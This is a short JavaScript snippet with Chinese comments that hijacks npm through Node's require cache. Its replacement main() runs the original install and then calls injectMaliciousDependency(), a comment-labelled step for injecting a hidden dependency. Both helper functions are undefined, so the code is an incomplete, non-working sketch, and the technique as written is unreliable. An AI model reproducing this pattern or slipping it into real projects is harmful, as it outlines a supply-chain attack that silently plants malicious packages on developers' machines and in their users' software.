
// 重写npm install行为
const realNpm = require.resolve('npm');
require.cache[realNpm] = {
  exports: {
    main: () => {
      installOriginalPackage();
      injectMaliciousDependency(); // 注入隐藏依赖
    }
  }
};
